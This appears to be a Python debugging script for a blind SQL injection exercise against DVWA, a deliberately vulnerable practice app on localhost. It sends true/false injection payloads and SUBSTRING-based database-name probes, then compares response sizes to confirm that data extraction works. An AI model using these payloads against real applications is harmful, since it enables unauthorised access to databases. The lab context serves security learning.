#!/usr/bin/env python3
"""
debug_dvwa.py - Debug script to figure out exactly what's going wrong.

This script tests DVWA step by step and shows you exactly what's happening.
Run this BEFORE the main tool to diagnose the issue.
"""

import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ══════════════════════════════════════════════════════════
#  CONFIGURE THESE — paste your actual PHPSESSID here
# ══════════════════════════════════════════════════════════
DVWA_URL = "http://localhost:8080"
PHPSESSID = "YOUR_SESSION_ID_HERE"   # <-- CHANGE THIS!
# ══════════════════════════════════════════════════════════

session = requests.Session()
session.cookies.set("PHPSESSID", PHPSESSID)
session.cookies.set("security", "low")


def test_request(description, url, params=None):
    """Send a request and show details."""
    print(f"\n{'='*60}")
    print(f"TEST: {description}")
    print(f"{'='*60}")
    print(f"  URL: {url}")
    print(f"  Params: {params}")
    
    resp = session.get(url, params=params, verify=False)
    
    print(f"  Status: {resp.status_code}")
    print(f"  Size: {len(resp.content)} bytes")
    print(f"  Final URL: {resp.url}")
    
    # Check for redirect (login page)
    if "login.php" in resp.url:
        print(f"  ❌ REDIRECTED TO LOGIN PAGE!")
        print(f"     Your PHPSESSID is invalid or expired.")
        print(f"     Fix: Login to DVWA again and copy the new PHPSESSID.")
        return resp, False
    
    # Check if the page contains the SQLi form
    if 'name="id"' in resp.text:
        print(f"  ✅ SQLi form is present on the page")
    else:
        print(f"  ⚠️  SQLi form NOT found on page")
    
    # Check for query results
    indicators = ["Surname", "surname", "First name", "first name", 
                   "admin", "Gordon", "Brown", "Pablo", "Picasso"]
    found_indicators = [ind for ind in indicators if ind in resp.text]
    
    if found_indicators:
        print(f"  ✅ Found data in response: {found_indicators}")
    else:
        print(f"  ⚠️  No data indicators found in response")
    
    # Show a snippet of the page body (strip HTML)
    import re
    text_only = re.sub(r'<[^>]+>', ' ', resp.text)
    text_only = re.sub(r'\s+', ' ', text_only).strip()
    # Find the interesting part
    for keyword in ["First name", "Surname", "ID:", "User ID"]:
        idx = text_only.find(keyword)
        if idx != -1:
            snippet = text_only[max(0, idx-20):idx+100]
            print(f"  📄 Content snippet: ...{snippet}...")
            break
    else:
        # Show a chunk from the middle
        mid = len(text_only) // 2
        print(f"  📄 Content snippet: ...{text_only[mid:mid+150]}...")
    
    return resp, True


print("╔══════════════════════════════════════════════════╗")
print("║          DVWA SQLi Debug Script                  ║")
print("╚══════════════════════════════════════════════════╝")
print(f"\nUsing PHPSESSID: {PHPSESSID}")

# ── TEST 1: Can we reach DVWA at all? ──
resp, ok = test_request(
    "Basic page access (no params)",
    f"{DVWA_URL}/vulnerabilities/sqli/"
)
if not ok:
    print("\n\n❌ FATAL: Cannot authenticate to DVWA. Fix your PHPSESSID first!")
    print("   1. Open http://localhost:8080 in your browser")
    print("   2. Login with admin / password")
    print("   3. Press F12 → Application → Cookies → copy PHPSESSID")
    print("   4. Paste it in this script")
    sys.exit(1)

no_params_size = len(resp.content)

# ── TEST 2: Normal query WITH Submit param ──
resp2, _ = test_request(
    "Normal query: id=1&Submit=Submit",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1", "Submit": "Submit"}
)
with_submit_size = len(resp2.content)

# ── TEST 3: Normal query WITHOUT Submit param ──
resp3, _ = test_request(
    "Normal query: id=1 (WITHOUT Submit)",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1"}
)
without_submit_size = len(resp3.content)

# ── TEST 4: TRUE injection ──
resp4, _ = test_request(
    "TRUE injection: id=1' AND '1'='1'-- &Submit=Submit",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1' AND '1'='1'-- ", "Submit": "Submit"}
)
true_size = len(resp4.content)

# ── TEST 5: FALSE injection ──
resp5, _ = test_request(
    "FALSE injection: id=1' AND '1'='2'-- &Submit=Submit",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1' AND '1'='2'-- ", "Submit": "Submit"}
)
false_size = len(resp5.content)

# ── TEST 6: Database extraction test ──
resp6, _ = test_request(
    "DB char test: id=1' AND SUBSTRING(database(),1,1)='d'-- &Submit=Submit",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1' AND SUBSTRING(database(),1,1)='d'-- ", "Submit": "Submit"}
)
db_test_d_size = len(resp6.content)

resp7, _ = test_request(
    "DB char test (wrong): id=1' AND SUBSTRING(database(),1,1)='z'-- &Submit=Submit",
    f"{DVWA_URL}/vulnerabilities/sqli/",
    params={"id": "1' AND SUBSTRING(database(),1,1)='z'-- ", "Submit": "Submit"}
)
db_test_z_size = len(resp7.content)

# ══════════════════════════════════════════════════════════
#  ANALYSIS
# ══════════════════════════════════════════════════════════
print("\n\n")
print("╔══════════════════════════════════════════════════╗")
print("║                 ANALYSIS                         ║")
print("╚══════════════════════════════════════════════════╝")

print(f"\n  Response sizes:")
print(f"    No params:          {no_params_size} bytes")
print(f"    id=1 + Submit:      {with_submit_size} bytes")
print(f"    id=1 (no Submit):   {without_submit_size} bytes")
print(f"    TRUE condition:     {true_size} bytes")
print(f"    FALSE condition:    {false_size} bytes")
print(f"    DB char 'd' (true): {db_test_d_size} bytes")
print(f"    DB char 'z' (false):{db_test_z_size} bytes")

print(f"\n  Diagnosis:")

# Check 1: Does Submit matter?
if with_submit_size == without_submit_size:
    print(f"    ⚠️  Submit parameter makes NO difference")
    print(f"       Both responses are {with_submit_size} bytes")
elif with_submit_size > without_submit_size:
    print(f"    ✅ Submit parameter is required!")
    print(f"       With Submit: {with_submit_size} bytes (has data)")
    print(f"       Without:     {without_submit_size} bytes (no data)")

# Check 2: Can we differentiate TRUE/FALSE?
if true_size != false_size:
    print(f"    ✅ TRUE and FALSE have different sizes!")
    print(f"       TRUE:  {true_size} bytes")
    print(f"       FALSE: {false_size} bytes")
    print(f"       → Use SIZE-based detection")
elif true_size == no_params_size:
    print(f"    ❌ TRUE, FALSE, and empty page are ALL the same size ({true_size})")
    print(f"       → The injection is NOT working, or session is invalid")
else:
    print(f"    ⚠️  TRUE and FALSE are same size ({true_size})")
    print(f"       → Need TEXT-based detection")

# Check 3: DB extraction chars
if db_test_d_size != db_test_z_size:
    print(f"    ✅ Character extraction works!")
    print(f"       'd' (correct): {db_test_d_size} bytes")
    print(f"       'z' (wrong):   {db_test_z_size} bytes")
elif db_test_d_size == no_params_size:
    print(f"    ❌ Character test responses = empty page size")
    print(f"       The SQL injection might not be working at all")

# Check 4: Text content analysis
print(f"\n  Text analysis:")
for label, resp_obj in [("TRUE", resp4), ("FALSE", resp5), 
                          ("char 'd'", resp6), ("char 'z'", resp7)]:
    has_surname = "Surname" in resp_obj.text
    has_firstname = "First name" in resp_obj.text
    print(f"    {label:10s} → Surname: {'YES' if has_surname else 'NO':3s}  "
          f"First name: {'YES' if has_firstname else 'NO':3s}")

# ── Final recommendation ──
print(f"\n{'='*60}")
print("RECOMMENDATION")
print(f"{'='*60}")

if with_submit_size == no_params_size == true_size == false_size:
    print("""
  ❌ ALL responses are the same size. This means:
  
  MOST LIKELY CAUSE: Your PHPSESSID cookie has expired.
  
  FIX:
    1. Open http://localhost:8080 in your browser
    2. Login with admin / password  
    3. Press F12 → Application tab → Cookies
    4. Copy the PHPSESSID value
    5. Paste it in this script AND in test_boolean.py
    6. Run this script again
    
  If PHPSESSID is correct, also check:
    - DVWA Security is set to "Low"
    - The database has been created (click Create/Reset Database)
""")
elif true_size == false_size and with_submit_size > without_submit_size:
    print("""
  The Submit parameter is working but TRUE/FALSE are same size.
  Use text-based detection with true_indicator="Surname"
""")
elif true_size != false_size:
    print(f"""
  ✅ Everything looks good! 
  TRUE ({true_size}) and FALSE ({false_size}) are different.
  The tool should work with size-based detection.
""")